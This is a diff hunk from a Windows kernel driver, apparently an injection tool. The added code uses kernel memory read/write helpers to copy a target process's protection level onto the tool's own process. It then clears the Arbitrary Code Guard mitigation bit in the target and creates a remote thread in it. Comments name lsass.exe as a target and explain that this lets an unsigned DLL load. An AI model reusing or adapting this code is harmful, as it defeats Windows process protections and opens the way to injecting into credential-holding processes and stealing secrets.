@@ -1143,17 +1143,25 @@ Handle_CreateRemoteThread(
 				return STATUS_UNSUCCESSFUL;
 			}
 
-			Log(L"get target PID=%u's original SectionSignatureLevel=%d\n", 
-				targetPid, ori_value.SectionSignatureLevelValue);
+			if (!Mini_ReadKernelMemory((PVOID)((PUCHAR)ep + off.ProtectionOffset), &ori_value.ProtectionValue, sizeof(UCHAR))) {
+				Log(L"failed to call Mini_ReadKernelMemory to read out Protection value, target PID=%u\n", targetPid);
+				ObDereferenceObject(ep);
+				return STATUS_UNSUCCESSFUL;
+			}
+			// PPL process such as lsass.exe have arbitary code mitigation set, which will block our dll from loading
+			// nt!MiArbitraryCodeBlocked will check this bit, if set, dll outside KnownDlls can not be loaded
+			// we can search in kernel code to get the accurate offset and position
+			// first locate export function nt!NtMapViewOfSection, the search asm code pattern to finally get nt!MiArbitraryCodeBlocked
+			Log(L"get target PID=%u's original SectionSignatureLevel=%d, original Protection=%d\n",
+				targetPid, ori_value.SectionSignatureLevelValue,ori_value.ProtectionValue);
 			UCHAR _ = 0;
 			// we should NOT modify target process's protection field, it may affect its feature
 			// but we're allowed to modify its signature level so we can inject
 			// it is time for us to refactor our client as a UI/Service seperated application
-			// elevate Suicide to PPL process
+			// elevate Suicide to the same protection level as target process
 			PEPROCESS suicide_ep = PsGetCurrentProcess();
-			UCHAR _ppl_value = 0x31;
-			 if (!Mini_WriteKernelMemory((PVOID)((PUCHAR)suicide_ep + off.ProtectionOffset), &_ppl_value, sizeof(UCHAR))) {
-				 Log(L"failed to call Mini_WriteKernelMemory to  elevate Suicide to PPL process\n");
+			 if (!Mini_WriteKernelMemory((PVOID)((PUCHAR)suicide_ep + off.ProtectionOffset), &ori_value.ProtectionValue, sizeof(UCHAR))) {
+				 Log(L"failed to call Mini_WriteKernelMemory to elevate Suicide to PPL process\n");
 			 	ObDereferenceObject(ep);
 			 	return STATUS_UNSUCCESSFUL;
 			 }
@@ -1174,9 +1182,30 @@ Handle_CreateRemoteThread(
 		// after get original offset, we need save original value first, then we zero it our, then we call create thread
 		// then we deference EP
 	}
+
+	// check if acg mitigation enabled
+	ACG_MitigationOffPos acg = { 0 };
+	 DriverCtx_GetACGMitigationOffPosInfo(&acg);
+	 if (acg.acg_pos) {
+		 DWORD ori_acg_value = 0;
+		 if (!Mini_ReadKernelMemory((PVOID)((PUCHAR)ep + acg.mitigation), &ori_acg_value, sizeof(DWORD))) {
+			 Log(L"failed to call Mini_ReadKernelMemory to read out original acg mitigation value, target PID=%u\n", targetPid);
+			 ObDereferenceObject(ep);
+			 return STATUS_UNSUCCESSFUL;
+		 }
+		 Log(L"get target PID=%u's original acg mitigation value=%d\n",
+			 targetPid, ori_acg_value);
+		 DWORD erased = ori_acg_value & (~(1 << acg.acg_pos));
+		 if (!Mini_WriteKernelMemory((PVOID)((PUCHAR)ep + acg.mitigation), &erased, sizeof(DWORD))) {
+			 Log(L"failed to call Mini_WriteKernelMemory to delete acg mitigation flag\n");
+			 ObDereferenceObject(ep);
+			 return STATUS_UNSUCCESSFUL;
+		 }
+	 }
 	NTSTATUS status = pfnNtCreateThreadEx(extraValue, THREAD_ALL_ACCESS, NULL, proc_handle, startRoutine, parameter, 0, 0, 0, 0, NULL);
 
-	
+
+	ObDereferenceObject(ep);
 	// Note: keep hTargetProc and targetProc alive until after thread creation
 	if (!NT_SUCCESS(status)) {
 		Log(L"failed to call pfnNtCreateThreadEx, Status=0x%x\n", status);
